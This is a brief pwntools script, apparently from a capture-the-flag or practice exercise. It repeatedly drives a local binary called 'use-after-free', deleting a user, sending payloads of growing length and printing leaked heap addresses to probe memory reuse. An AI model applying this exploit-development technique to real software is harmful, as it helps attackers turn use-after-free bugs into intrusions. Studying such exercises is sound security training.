from pwn import *

target = "use-after-free"

for i in range(100):
    p = process(target)

    payload = b"a"*i

    p.recvuntil(">>>")
    p.sendline("delete-user")
    p.recvuntil(':')
    p.sendline("Kim")
    del_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
    p.sendline("msg")
    print(p.recvuntil(":"))
    p.sendline(payload)
    msg_addr = p.recvuntil(">>>").decode().split('@')[1][:14]
    print(del_addr, msg_addr)
#gdb.attach(p)
#interactive()
